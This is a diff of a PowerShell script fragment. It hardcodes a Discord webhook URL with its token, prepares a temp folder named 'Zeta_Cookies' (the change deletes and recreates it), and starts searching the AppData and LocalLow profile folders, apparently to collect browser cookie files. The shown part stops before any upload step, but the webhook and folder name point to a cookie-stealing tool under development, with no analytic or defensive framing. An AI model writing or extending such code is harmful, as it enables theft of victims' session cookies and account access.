@@ -1,6 +1,7 @@
 $webhook = "https://discord.com/api/webhooks/1517874969986732133/srfBAzpYR38NikmVRgDs5AoroLpvV4uBQDpjWtvLymm_qGHcY2AOMF1zDNHXDH0JrOaz"
 $d = "$env:TEMP\Zeta_Cookies"
-md $d -Force -ErrorAction SilentlyContinue | Out-Null
+if (Test-Path $d) { Remove-Item $d -Recurse -Force -ErrorAction SilentlyContinue }
+New-Item -Path $d -ItemType Directory -Force -ErrorAction SilentlyContinue | Out-Null
 $found = @()
 $searchPaths = @($env:APPDATA, $env:LOCALAPPDATA, (Join-Path $env:LOCALAPPDATA '..\LocalLow'))
 foreach ($base in $searchPaths) {
